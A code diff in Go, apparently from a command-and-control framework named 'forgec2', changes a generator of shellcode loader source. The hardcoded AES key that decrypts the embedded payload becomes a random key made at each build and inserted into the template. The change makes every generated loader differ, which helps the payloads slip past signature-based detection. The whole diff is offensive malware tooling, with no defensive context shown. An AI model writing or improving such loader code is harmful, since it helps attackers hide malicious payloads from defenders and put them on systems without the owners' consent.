@@ -184,6 +184,9 @@ func generateLoaderSource(tmpl ArtifactTemplate) string {
 	if ep == "" {
 		ep = "direct"
 	}
+	aesKey := make([]byte, 16)
+	rand.Read(aesKey)
+	aesKeyHex := hex.EncodeToString(aesKey)
 	tmplSource := `package main
 
 import (
@@ -217,17 +220,14 @@ func getShellcode() []byte {
 			data[i] ^= key[i%len(key)]
 		}
 	case "aes":
-		block, _ := aes.NewCipher(key16())
+		k, _ := hex.DecodeString("{{.AESKey}}")
+		block, _ := aes.NewCipher(k)
 		iv := data[:aes.BlockSize]
 		stream := cipher.NewCTR(block, iv)
 		stream.XORKeyStream(data[aes.BlockSize:], data[aes.BlockSize:])
 		data = data[aes.BlockSize:]
 	}
 	return data
-}
-
-func key16() []byte {
-	return []byte("forgec2-aes-key!")
 }
 
 func main() {
@@ -252,6 +252,7 @@ func main() {
 	data := map[string]string{
 		"EncType":    encType,
 		"EntryPoint": ep,
+		"AESKey":     aesKeyHex,
 	}
 	t := template.Must(template.New("loader").Parse(tmplSource))
 	var buf bytes.Buffer
